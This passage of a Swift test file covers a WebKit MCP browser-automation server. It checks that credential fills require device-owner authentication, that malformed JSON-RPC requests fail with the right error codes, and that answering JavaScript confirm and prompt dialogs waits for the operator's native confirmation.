      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let server = WebKitMCPServer(
      registry: registry,
      credentialBroker: FixedStatusCredentialBrokerStub(status: .userPresenceUnavailable)
    )
    let observed = try await toolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server,
      id: 2,
      name: "browser_fill_siliconpass",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "username_element_id": .string("e1"),
        "password_element_id": .string("e2"),
      ]
    )
    let result = try object(try object(response["result"])["structuredContent"])
    #expect(result["status"] == .string("user_presence_unavailable"))
    #expect(result["requires_user_presence"] == .bool(true))
    #expect(result["retryable"] == .bool(true))
    #expect(result["automatic_retry"] == .bool(false))
    #expect(result["secret_released"] == .bool(false))
    #expect(result["authentication_policy"] == .string("device_owner_authentication"))
    #expect(
      result["accepted_methods"]
        == .array([
          .string("system_device_owner_authentication")
        ]))
    #expect(
      result["recovery"]
        == .string(
          "Unlock this Mac and retry from an interactive session using the authentication method offered by macOS. Closed-lid availability is device-specific and is not inferred."
        ))
  }

  @Test("Malformed requests and tool arguments fail at the right boundary")
  func failures() async throws {
    let server = try WebKitMCPServer()
    let parse = try decode(await server.handle(Data("not-json".utf8)))
    #expect(try object(parse["error"])["code"] == .int(-32700))

    let invalid = try await call(
      server,
      id: 1,
      method: "tools/call",
      params: .object([
        "name": .string("browser_session"),
        "arguments": .object([
          "operation": .string("status"), "session_id": .string("not-a-uuid"),
        ]),
      ]),
      modern: true
    )
    #expect(try object(invalid["error"])["code"] == .int(-32602))
  }

  private func toolCall(
    _ server: WebKitMCPServer,
    id: Int64,
    name: String,
    arguments: [String: JSONValue]
  ) async throws -> [String: JSONValue] {
    try await call(
      server,
      id: id,
      method: "tools/call",
      params: .object([
        "name": .string(name),
        "arguments": .object(arguments),
      ]),
      modern: true
    )
  }

  private func legacyToolCall(
    _ server: WebKitMCPServer,
    id: Int64,
    name: String,
    arguments: [String: JSONValue]
  ) async throws -> [String: JSONValue] {
    try await call(
      server,
      id: id,
      method: "tools/call",
      params: .object([
        "name": .string(name),
        "arguments": .object(arguments),
      ]),
      modern: false
    )
  }

  private func roundTripToolCall(
    _ server: WebKitMCPServer,
    id: Int64,
    name: String,
    arguments: [String: JSONValue],
    requestState: String,
    action: String,
    confirm: Bool?
  ) async throws -> [String: JSONValue] {
    var response: [String: JSONValue] = ["action": .string(action)]
    if let confirm { response["content"] = .object(["confirm": .bool(confirm)]) }
    return try await call(
      server,
      id: id,
      method: "tools/call",
      params: .object([
        "name": .string(name),
        "arguments": .object(arguments),
        "requestState": .string(requestState),
        "inputResponses": .object(["confirmation": .object(response)]),
      ]),
      modern: true
    )
  }

  private func call(
    _ server: WebKitMCPServer,
    id: Int64,
    method: String,
    params: JSONValue,
    modern: Bool
  ) async throws -> [String: JSONValue] {
    var request: [String: JSONValue] = [
      "jsonrpc": .string("2.0"),
      "id": .int(id),
      "method": .string(method),
      "params": params,
    ]
    if modern {
      var parameterObject = try object(request["params"])
      parameterObject["_meta"] = .object([
        "io.modelcontextprotocol/protocolVersion": .string("2026-07-28"),
        "io.modelcontextprotocol/clientInfo": .object([
          "name": .string("tests"), "version": .string("1"),
        ]),
        "io.modelcontextprotocol/clientCapabilities": .object([
          "elicitation": .object([:])
        ]),
      ])
      request["params"] = .object(parameterObject)
    }
    let data = try JSONEncoder().encode(JSONValue.object(request))
    return try decode(await server.handle(data))
  }

  private func rawCall(
    _ server: WebKitMCPServer,
    id: Int64,
    method: String,
    params: JSONValue
  ) async throws -> [String: JSONValue] {
    let request: JSONValue = .object([
      "jsonrpc": .string("2.0"),
      "id": .int(id),
      "method": .string(method),
      "params": params,
    ])
    return try decode(await server.handle(try JSONEncoder().encode(request)))
  }

  private func decode(_ data: Data?) throws -> [String: JSONValue] {
    guard let data else { throw TestError.missingResponse }
    return try object(try JSONDecoder().decode(JSONValue.self, from: data))
  }

  private func object(_ value: JSONValue?) throws -> [String: JSONValue] {
    guard case .object(let object) = value else { throw TestError.wrongType }
    return object
  }

  private func array(_ value: JSONValue?) throws -> [JSONValue] {
    guard case .array(let array) = value else { throw TestError.wrongType }
    return array
  }

  private func string(_ value: JSONValue?) throws -> String {
    guard case .string(let string) = value else { throw TestError.wrongType }
    return string
  }

  /// Resolves the observed control carrying an exact accessible name, so a fixture's
  /// heading never stands in for its file input.
  private func fileControlID(
    in observation: [String: JSONValue], labelled label: String
  ) throws -> String {
    for element in try array(observation["elements"]) {
      let fields = try object(element)
      guard let name = fields["accessibleName"],
        case .object(let provenanced) = name,
        let segments = provenanced["segments"],
        case .array(let parts) = segments
      else { continue }
      let text = try parts.map { try string(object($0)["text"]) }.joined()
      if text == label { return try string(fields["elementID"]) }
    }
    throw TestError.wrongType
  }

  /// Loads a page that is ready, then makes it wait on one JavaScript panel opened from
  /// a timer. The panel cannot be opened from the awaited script itself: `confirm()` and
  /// `prompt()` suspend the page inside the call.
  private func sessionWaitingOnJavaScriptDialog(
    _ script: String,
    responses: [Bool]
  ) async throws -> (
    handle: WebKitSessionHandle, runtime: WebKitRuntime, server: WebKitMCPServer,
    presenter: ConfirmationPresenterStub, dialogID: String
  ) {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<title>Invoices</title><p>ready</p>", baseURL: URL(string: "https://example.test/invoices"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: responses)
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    _ = try await runtime.webView.evaluateJavaScript(script)
    let dialogID = try #require(
      await awaitPendingDialogID(on: runtime), "no JavaScript dialog was ever reported")
    return (handle, runtime, server, presenter, dialogID)
  }

  @Test("A confirmed dialog accept makes the page's own confirm() return true")
  func confirmedJavaScriptDialogAccept() async throws {
    let session = try await sessionWaitingOnJavaScriptDialog(
      "setTimeout(() => { window.__answer = confirm('Delete invoice 1471?') }, 0)",
      responses: [true])

    let answered = try await toolCall(
      session.server, id: 1, name: "browser_act",
      arguments: [
        "session_id": .string(session.handle.rawValue.uuidString),
        "operation": .string("dialog_accept"),
        "dialog_id": .string(session.dialogID),
        "idempotency_key": .string("dialog-accept-once"),
      ])
    let structured = try object(try object(answered["result"])["structuredContent"])
    #expect(structured["dialog_outcome"] == .string("accepted"))
    #expect(structured["dialog_kind"] == .string("confirm"))
    #expect(session.presenter.requests.count == 1, "the native dialog was never asked for")
    #expect(session.presenter.requests[0].message.contains("Delete invoice 1471?"))

    #expect(await awaitPageDialogAnswer(on: session.runtime) as? Bool == true)
    #expect(session.runtime.pendingJavaScriptDialog() == nil)
  }

  @Test("A confirmed dialog dismiss makes the page's own confirm() return false")
  func confirmedJavaScriptDialogDismiss() async throws {
    let session = try await sessionWaitingOnJavaScriptDialog(
      "setTimeout(() => { window.__answer = confirm('Delete invoice 1471?') }, 0)",
      responses: [true])

    let answered = try await toolCall(
      session.server, id: 1, name: "browser_act",
      arguments: [
        "session_id": .string(session.handle.rawValue.uuidString),
        "operation": .string("dialog_dismiss"),
        "dialog_id": .string(session.dialogID),
        "idempotency_key": .string("dialog-dismiss-once"),
      ])
    let structured = try object(try object(answered["result"])["structuredContent"])
    #expect(structured["dialog_outcome"] == .string("dismissed"))
    #expect(await awaitPageDialogAnswer(on: session.runtime) as? Bool == false)
  }

  @Test("A confirmed prompt accept supplies the exact value the page reads back")
  func confirmedJavaScriptPromptAcceptsExactValue() async throws {
    let session = try await sessionWaitingOnJavaScriptDialog(
      "setTimeout(() => { window.__answer = prompt('New statement name', 'Untitled') }, 0)",
      responses: [true])
    #expect(
      session.runtime.pendingJavaScriptDialog()?.defaultText?.segments.map(\.text).joined()
        == "Untitled")

    let answered = try await toolCall(
      session.server, id: 1, name: "browser_act",
      arguments: [
        "session_id": .string(session.handle.rawValue.uuidString),
        "operation": .string("dialog_accept_value"),
        "dialog_id": .string(session.dialogID),
        "value": .string("Q3 Statements"),
        "idempotency_key": .string("dialog-prompt-once"),
      ])
    let structured = try object(try object(answered["result"])["structuredContent"])
    #expect(structured["dialog_outcome"] == .string("accepted"))
    #expect(structured["dialog_kind"] == .string("prompt"))
    #expect(structured["dialog_value_supplied"] == .bool(true))
    // The operator has to read the exact string that will be handed to the site.
    #expect(session.presenter.requests[0].message.contains("Q3 Statements"))
    #expect(await awaitPageDialogAnswer(on: session.runtime) as? String == "Q3 Statements")
  }

  @Test("A declined dialog confirmation leaves the dialog pending and answers nothing")
  func declinedJavaScriptDialogConfirmationAnswersNothing() async throws {
    let session = try await sessionWaitingOnJavaScriptDialog(
      "setTimeout(() => { window.__answer = confirm('Delete invoice 1471?') }, 0)",
      responses: [false])

    let refused = try await toolCall(
      session.server, id: 1, name: "browser_act",
      arguments: [
        "session_id": .string(session.handle.rawValue.uuidString),
        "operation": .string("dialog_accept"),
        "dialog_id": .string(session.dialogID),
        "idempotency_key": .string("dialog-declined-once"),
      ])
    #expect(try object(refused["result"])["isError"] == .bool(true))
    let structured = try object(try object(refused["result"])["structuredContent"])
    #expect(structured["status"] == .string("declined_by_user"))
    // The panel is still the operator's to answer: a refusal must not become a Cancel.
    #expect(session.runtime.pendingJavaScriptDialog()?.dialogID == session.dialogID)
    #expect(session.runtime.latestJavaScriptDialogRecord() == nil)

    // Never leave a suspended page behind for whatever runs next.
    _ = try session.runtime.answerJavaScriptDialog(dialogID: session.dialogID, accept: false)
  }

  private enum TestError: Error {
    case missingResponse
    case wrongType
  }
}
